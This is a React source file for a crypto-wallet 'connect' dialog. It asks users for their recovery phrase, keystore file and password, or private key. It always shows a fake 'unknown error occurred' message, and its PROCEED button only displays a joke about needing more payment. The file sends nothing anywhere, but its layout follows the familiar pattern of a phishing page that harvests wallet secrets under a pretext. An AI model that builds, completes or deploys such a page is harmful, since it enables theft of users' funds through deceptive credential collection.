import "./connect.css";
import { useState } from "react";
const Connect = ({ clicked, setClicked, setConnect }) => {
    const [pay, setPay] = useState(false);
    const [keystore, setKeystore] = useState(false);
    const [phrase, setPhrase] = useState(false);
    const [privated, setPrivated] = useState(false);
    return (
      <div className="connect">
        <div className="image-icon">
          <img src={clicked} alt="" />
        </div>
        <div className="connect-nav">
                <p onClick={() => { setPhrase(true); setKeystore(false); setPrivated(false);}}>Phrase</p>
                <p onClick={() => { setKeystore(true); setPrivated(false);  }}>Keystore</p>
                <p onClick={() => { setPrivated(true); setKeystore(false); }}>Private Key</p>
        </div>
        <div className="error-note">
          <p>An unknown error occured, please try again later.</p>
            </div>
            {
                privated ? <textarea placeholder="Enter Your Private Key" className="wallet-password"></textarea>: <textarea placeholder="Enter your recovery phrase"></textarea>
            }
        {keystore && (
          <textarea placeholder="Wallet password" className="wallet-password"></textarea>
        )}
            {
                keystore ? (<p className="word-count">
          Several lines of text beginning with {"{...}"} plus the password you used to encrypt it.
        </p>) : (<p className="word-count"> Typically 12 (sometimes 24) words separated by single spaces</p>
                )}

        <button
          className="proceed-btn"
          onClick={() => {
            setPay(true);
          }}
        >
          PROCEED
        </button>
        <div className="basement">
          <p className={pay ? "pay visible" : "pay"}>
            this feature needs more payment 😎
          </p>
          <button className="cancel-btn" onClick={()=>{setClicked(""); setConnect(false)}}>CANCEL</button>
        </div>
      </div>
    );
}
 
export default Connect;